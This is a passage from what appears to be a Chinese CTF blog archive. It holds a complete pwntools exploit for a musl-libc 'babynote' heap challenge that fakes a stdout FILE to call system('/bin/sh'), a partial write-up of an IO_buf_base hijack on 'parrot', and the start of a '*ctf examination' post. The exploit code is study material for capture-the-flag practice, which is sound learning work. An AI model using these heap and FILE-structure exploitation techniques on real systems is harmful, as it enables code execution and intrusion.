</span><br><span class="line">  buf_size = <span class="number">0</span>, </span><br><span class="line">  prev = <span class="number">0x0</span>, </span><br><span class="line">  next = <span class="number">0x0</span>, </span><br><span class="line">  fd = <span class="number">0</span>, </span><br><span class="line">  pipe_pid = <span class="number">0</span>, </span><br><span class="line">  lockcount = <span class="number">0</span>, </span><br><span class="line">  mode = <span class="number">0</span>, </span><br><span class="line">  lock = <span class="number">0</span>, </span><br><span class="line">  lbf = <span class="number">0</span>, </span><br><span class="line">  cookie = <span class="number">0x0</span>, </span><br><span class="line">  off = <span class="number">0</span>, </span><br><span class="line">  getln_buf = <span class="number">0x0</span>, </span><br><span class="line">  mustbezero_2 = <span class="number">0x0</span>, </span><br><span class="line">  shend = <span class="number">0x0</span>, </span><br><span class="line">  shlim = <span class="number">0</span>, </span><br><span class="line">  shcnt = <span class="number">0</span>, </span><br><span class="line">  prev_locked = <span class="number">0x0</span>, </span><br><span class="line">  next_locked = <span class="number">0x0</span>, </span><br><span class="line">  locale = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最后exit结束程序</p>
<h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><p>部分注释可能错误</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level =<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so&quot;</span>)</span><br><span class="line">r=process([<span class="string">&quot;./libc.so&quot;</span>,<span class="string">&#x27;./babynote&#x27;</span>])</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babynote&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get8</span>():</span><br><span class="line">	ret = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">		ret = r.recv(<span class="number">2</span>)+ret</span><br><span class="line">	ret = <span class="string">b&#x27;0x&#x27;</span>+ret</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">int</span>(ret,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get4</span>():</span><br><span class="line">	ret = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">		ret = r.recv(<span class="number">2</span>)+ret</span><br><span class="line">	ret = <span class="string">b&#x27;0x&#x27;</span>+ret</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">int</span>(ret,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ch</span>(<span class="params">i</span>):</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;option:&quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name,text</span>):</span><br><span class="line">	ch(<span class="number">1</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;name size:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(name)))</span><br><span class="line">	r.sendafter(<span class="string">&quot;name&quot;</span>,name)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;size&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(text)))</span><br><span class="line">	r.sendafter(<span class="string">&quot;content&quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">name</span>):</span><br><span class="line">	ch(<span class="number">2</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;name size:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(name)))</span><br><span class="line">	r.sendafter(<span class="string">&quot;name&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">name</span>):</span><br><span class="line">	ch(<span class="number">3</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;name size:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(name)))</span><br><span class="line">	r.sendafter(<span class="string">&quot;name&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean</span>():			<span class="comment">#only set list=0 </span></span><br><span class="line">	ch(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(r,<span class="string">&#x27;b malloc&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">add(<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x28</span>)<span class="comment">#slot full size is 0x2c</span></span><br><span class="line">add(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x50</span>)<span class="comment">#slot full size is 0x6c</span></span><br><span class="line">free(<span class="string">b&#x27;a&#x27;</span>)				<span class="comment">#free the first note,the meta(0xc)is freed,</span></span><br><span class="line">clean()					<span class="comment">#now meta(0x2c) has one no use,and 1 freed,meta(0xc) heav 3 freed</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>)		<span class="comment">#we alloc the last slot in meta(0x2c) for abynote,</span></span><br><span class="line">						<span class="comment">#.Reuse the 0 solt in meta(0xc) (malloc from bins),</span></span><br><span class="line">						<span class="comment">#then reuse the free slot in meta(0x2c)</span></span><br><span class="line">add(<span class="string">b&#x27;b&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>)			<span class="comment">#malloc a slot(0x2c) in a new meta2(0x2c,and malloc 2 slot(0xc) in meta(0xc)</span></span><br><span class="line"></span><br><span class="line">free(<span class="string">b&#x27;a&#x27;</span>)			<span class="comment">#malloc a new slot(0xc),in meta(0xc),then free babynote a,then meta1(0x2c) will have 2 freed slot</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x28</span>)<span class="comment">#malloc 3slot from  meta2(0x2c),so meta1(0x2c),have 2 freed slot</span></span><br><span class="line">add(<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x28</span>)<span class="comment">#</span></span><br><span class="line">add(<span class="string">b&#x27;e&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;e&#x27;</span>*<span class="number">0x28</span>)<span class="comment">#fill up meta2(0x2c)</span></span><br><span class="line">add(<span class="string">b&#x27;f&#x27;</span>,<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x50</span>)		<span class="comment">#malloc a baby note from meta1(0x2c),meta1(0x2c) still have one freed, </span></span><br><span class="line"></span><br><span class="line">find(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;0x28:&quot;</span>)</span><br><span class="line">ss = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">	ss = r.recv(<span class="number">2</span>)+ss</span><br><span class="line">ss  = <span class="string">b&#x27;0x&#x27;</span>+ss</span><br><span class="line"><span class="built_in">print</span>(ss)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(ss,<span class="number">16</span>) </span><br><span class="line">libcbase = heap_addr-  <span class="number">0x29fdf0</span></span><br><span class="line">stdout = libcbase + <span class="number">0x2a0e00</span></span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">__malloc_context = <span class="number">0x2a1aa0</span>+libcbase</span><br><span class="line">ofl_head = libcbase+ <span class="number">0x2a3e28</span> </span><br><span class="line">fake_stdout_addr = libcbase+<span class="number">0x29ee20</span>			<span class="comment">#we can malloc0x50 to get </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libcbase : &quot;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system : &quot;</span>,<span class="built_in">hex</span>(system))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stdout : &quot;</span>,<span class="built_in">hex</span>(stdout))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#here we can leak anywhere</span></span><br><span class="line">pad = p64(libcbase+<span class="number">0x29fdb0</span>)+p64(__malloc_context)+p64(<span class="number">1</span>)+p64(<span class="number">0x420</span>)+p64(<span class="number">0</span>)</span><br><span class="line">find(pad)</span><br><span class="line">find(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#leak __malloc_context to  get meta addr</span></span><br><span class="line">r.recvuntil(<span class="string">b&quot;0x420:&quot;</span>)</span><br><span class="line">secret =get8()</span><br><span class="line">r.recv(<span class="number">16</span>)</span><br><span class="line">free_meta = get8()</span><br><span class="line">avail_meta = get8()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">	get8()</span><br><span class="line">active=<span class="built_in">list</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line">	active.append(get8())</span><br><span class="line">meta_base  = active[<span class="number">0</span>]-<span class="number">0x28</span></span><br><span class="line">add(<span class="string">b&#x27;Z&#x27;</span>*<span class="number">0x100</span>,<span class="string">b&#x27;Z&#x27;</span>*<span class="number">0x100</span>)				<span class="comment">#fill up  the old meta to create new meta3(0x2c)</span></span><br><span class="line"></span><br><span class="line">clean()</span><br><span class="line"></span><br><span class="line">fakemeta_addr = <span class="number">0x291020</span>+libcbase</span><br><span class="line">fake_meta =<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">4064</span>)+p64(secret)+p64(<span class="number">0</span>)*<span class="number">3</span> 												</span><br><span class="line">fake_meta += p64(ofl_head-<span class="number">0x8</span>)+p64(fake_stdout_addr)										<span class="comment">#fakemta1</span></span><br><span class="line">fake_meta +=p64(fakemeta_addr+<span class="number">0x40</span>)+p64(<span class="number">0x3fe</span>)+p64(<span class="number">0xa9</span>)+p64(<span class="number">0</span>)						</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_meta +=p64(fakemeta_addr+<span class="number">0x1000</span>)+p64(<span class="number">0x0000c00000000000</span>)</span><br><span class="line">fake_meta +=p64(fakemeta_addr)+p64(<span class="number">0x0000800000000009</span>)</span><br><span class="line">fake_meta +=<span class="string">b&quot;AAAAAAAA&quot;</span></span><br><span class="line">fake_meta = fake_meta.ljust((<span class="number">0x2000</span>-<span class="number">0x20</span>),<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_meta +=p64(secret)+p64(<span class="number">0</span>)*<span class="number">3</span>   														<span class="comment">#fake_area1</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(fakemeta_addr+<span class="number">0x30</span>)+p64(<span class="number">0x0</span>)+p64(<span class="number">0x3c0</span>)+p64(<span class="number">0</span>)			<span class="comment">#fakemeta2	</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#prepare fake chunk and fake sotor</span></span><br><span class="line">add(<span class="string">b&#x27;g&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;g&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">add(<span class="string">b&#x27;h&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;h&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">fakebabynote = p64( <span class="number">0x29fdd0</span> +libcbase)+p64(fakemeta_addr+<span class="number">0x50</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x28</span>)+p64(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">b&#x27;i&#x27;</span>,fakebabynote)</span><br><span class="line">free(<span class="string">b&#x27;g&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">gdb.attach(r)</span><br><span class="line">add(p64(<span class="number">0x29bd00</span>+libcbase)*<span class="number">2</span>+p64(<span class="number">0x8</span>)+p64(<span class="number">0x8</span>)+p64(libcbase+<span class="number">0x29bd90</span>),fake_meta.ljust(<span class="number">0x2000</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">free(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">fake_stdfile  =<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">1</span>)*<span class="number">2</span>+p64(system)*<span class="number">2</span></span><br><span class="line">fake_stdfile = fake_stdfile.ljust(<span class="number">0x50</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;i&#x27;</span>,fake_stdfile)</span><br><span class="line">pause()</span><br><span class="line">ch(<span class="number">5</span>)</span><br><span class="line">pause()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/241101">https://www.anquanke.com/post/id/241101</a></p>
<p><a href="https://blog.csdn.net/kali_Ma/article/details/122970885?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165044409316780265474836%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=165044409316780265474836&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-122970885.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&amp;utm_term=musl+%E5%A0%86%E5%88%A9%E7%94%A8&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/kali_Ma/article/details/122970885?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165044409316780265474836%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=165044409316780265474836&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-122970885.142^v9^control,157^v4^control&amp;utm_term=musl+%E5%A0%86%E5%88%A9%E7%94%A8&amp;spm=1018.2226.3001.4187</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>tw2017parrot</title>
    <url>/2022/03/22/tw2017parrot/</url>
    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="I-IO-buf-base劫持技术，"><a href="#I-IO-buf-base劫持技术，" class="headerlink" title="I IO_buf_base劫持技术，"></a>I IO_buf_base劫持技术，</h1><h2 id="文章写的会比较凌乱，是在一边解题同时记录"><a href="#文章写的会比较凌乱，是在一边解题同时记录" class="headerlink" title="文章写的会比较凌乱，是在一边解题同时记录"></a>文章写的会比较凌乱，是在一边解题同时记录</h2><h2 id="环境以及保护"><a href="#环境以及保护" class="headerlink" title="环境以及保护"></a>环境以及保护</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/pwnabletw/hijack_io_buf_base$ strings libc.so<span class="number">.6</span> | grep ubuntu </span><br><span class="line">GNU C <span class="title function_">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.23</span><span class="number">-0u</span>buntu11)</span> stable release version 2.23, by Roland McGrath et al.</span><br><span class="line">&lt;https:<span class="comment">//bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span></span><br><span class="line">giantbranch@ubuntu:~/Desktop/pwnabletw/hijack_io_buf_base$ checksec --file=tw2017parrot</span><br><span class="line">[*] <span class="string">&#x27;/home/giantbranch/Desktop/pwnabletw/hijack_io_buf_base/tw2017parrot&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">giantbranch@ubuntu:~/Desktop/pwnabletw/hijack_io_buf_base$ file tw2017parrot </span><br><span class="line">tw2017parrot: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">00f</span>bccd873daf9400480cbb4dbd48845f1bb97b8, not stripped</span><br><span class="line">giantbranch@ubuntu:~/Desktop/pwnabletw/hijack_io_buf_base$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ubuntu2.23下的题目，只有canary保护没有开启，没有思路</p>
<h2 id="主要代码"><a href="#主要代码" class="headerlink" title="主要代码"></a>主要代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  sleep(<span class="number">3u</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%lu&quot;</span>, &amp;size);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">if</span> ( !size )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    buf = <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Buffer:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, size);</span><br><span class="line">    *((_BYTE *)buf + size - <span class="number">1</span>) = <span class="number">0</span>;			<span class="comment">//这个很关键</span></span><br><span class="line">    write(<span class="number">1</span>, buf, size);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="初步印象"><a href="#初步印象" class="headerlink" title="初步印象"></a>初步印象</h3><p>代码很简单，malloc,free没有多余的操作，但是malloc不会清空申请的堆块中的内存，同时我们可以输入空。但是只有一个堆块，紧邻topchunk,无法利用unsortedbin泄露 main_arena,铃响其他办法</p>
<p>malloc的一个机制</p>
<p>当我们在应用层调用malloc申请堆的时候，在glibc中实际上调用的是_lib_malloc函数，但是_lib_malloc函数只是用来简单的封装_int_malloc函数的，_int_malloc函数才是申请堆的核心函数。<br>_int_malloc会根据应用层用户申请的内存块大小，从而分配相应的chunk给用户使用。</p>
<p>函数的分配堆内存的主要执行流程<br>①请求大小在fastbin的范围内：在fastbins中找是否有对应的chunk可以使用。<br>②请求大小在smallbin的范围内：在smallbin中找是否有对应的chunk可以使用。<br>③请求大小在largebin的范围内：先调用malloc_consolidate对fastbins进行整理加入unsortedbins。然后在unsortedbin中查看是否有满足要求的chunk可以使用。<br>④在largebin中寻找可用的chunk来使用。<br>⑤寻找较大的bin链中是否有可用的chunk来使用。<br>⑥切割topchunk来使用。<br>⑦topchunk也不够了，再次调用malloc_consolidate整理fastbins。<br>⑧topchunk不够用，再次malloc_consolidate之后还没有可以用的，最终调用sysmalloc（系统调用）申请内存。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_FILE_plus *)<span class="built_in">stdin</span></span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">-72540021</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x7f0883e32964</span> &lt;_IO_2_1_stdin_+<span class="number">132</span>&gt; <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x7f0883e32964</span> &lt;_IO_2_1_stdin_+<span class="number">132</span>&gt; <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x7f0883e32963</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x7f0883e32963</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x7f0883e32963</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x7f0883e32963</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x7f0883e32963</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x7f0883e32964</span> &lt;_IO_2_1_stdin_+<span class="number">132</span>&gt; <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0x0</span>, </span><br><span class="line">    _fileno = <span class="number">0</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">-1</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _lock = <span class="number">0x7f0883e34790</span> &lt;_IO_stdfile_0_lock&gt;, </span><br><span class="line">    _offset = <span class="number">-1</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x7f0883e329c0</span> &lt;_IO_wide_data_0&gt;, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">-1</span>, </span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0x7f0883e316e0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是正常的stdin的IO_FILE_plus结构体，_IO_buf_base 是输入缓冲区开始的地方（其实应该是read_base是开始的地方，但是这里肯可能是说read_base &#x3D; buf_base），记得程序代码那个末尾写0 吗。在这里将 _IO_buf_base最低位改为0.这个地址其实是_IO_write_base,这里就可以实现_IO_FILE_plus的覆盖</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_FILE_plus *)<span class="built_in">stdin</span></span><br><span class="line">$<span class="number">3</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">-72539989</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x7f0883e32901</span> &lt;_IO_2_1_stdin_+<span class="number">33</span>&gt; <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x7f0883e32928</span> &lt;_IO_2_1_stdin_+<span class="number">72</span>&gt; <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x7f0883e32900</span> &lt;_IO_2_1_stdin_+<span class="number">32</span>&gt; <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x7f0883e347a8</span> &lt;__free_hook&gt; <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x7f0883e347b8</span> &lt;next_to_use&gt; <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0x0</span>, </span><br><span class="line">    _fileno = <span class="number">0</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">-1</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _lock = <span class="number">0x7f0883e34790</span> &lt;_IO_stdfile_0_lock&gt;, </span><br><span class="line">    _offset = <span class="number">-1</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x7f0883e329c0</span> &lt;_IO_wide_data_0&gt;, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">-1</span>, </span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0x7f0883e316e0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>examination</title>
    <url>/2022/04/18/starctf_examination/</url>
    <content><![CDATA[<h1 id="from-2022-4-18-ctf-pwn-examination"><a href="#from-2022-4-18-ctf-pwn-examination" class="headerlink" title="from 2022.4.18 *ctf pwn examination"></a>from 2022.4.18 *ctf pwn examination</h1><h2 id="保护："><a href="#保护：" class="headerlink" title="保护："></a>保护：</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">dreamcat@ubuntu:~/Desktop<span class="comment">/*ctf/examin$ checksec --file=examination</span></span><br><span class="line"><span class="comment">RELRO           STACK CANARY      NX            PIE             </span></span><br><span class="line"><span class="comment">Full RELRO      Canary found      NX enabled    PIE enabled    </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE</span></span><br><span class="line"><span class="comment">No RPATH   RW-RUNPATH   No Symbols	  No	0		2		examination</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure>

<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>程序，进行了不同的模式，teacher 或者student，</p>
<h3 id="重要的结构体"><a href="#重要的结构体" class="headerlink" title="重要的结构体"></a>重要的结构体</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span> student         struc ; (<span class="keyword">sizeof</span>=<span class="number">0x20</span>, mappedto_8)					/chunksize=<span class="number">0x31</span></span><br><span class="line"><span class="number">00000000</span> stu             dq ?                    ; offset</span><br><span class="line"><span class="number">00000008</span> nop             dq ?</span><br><span class="line"><span class="number">00000010</span> mode            dq ?                    ; offset					/mode chunkszie =<span class="number">0x31</span></span><br><span class="line"><span class="number">00000018</span> Type            dd ?</span><br><span class="line"><span class="number">0000001</span>C win             dd ?</span><br><span class="line"><span class="number">00000020</span> student         ends</span><br><span class="line"><span class="number">00000020</span></span><br><span class="line"><span class="number">00000000</span> ; ---------------------------------------------------------------------------</span><br><span class="line"><span class="number">00000000</span></span><br><span class="line"><span 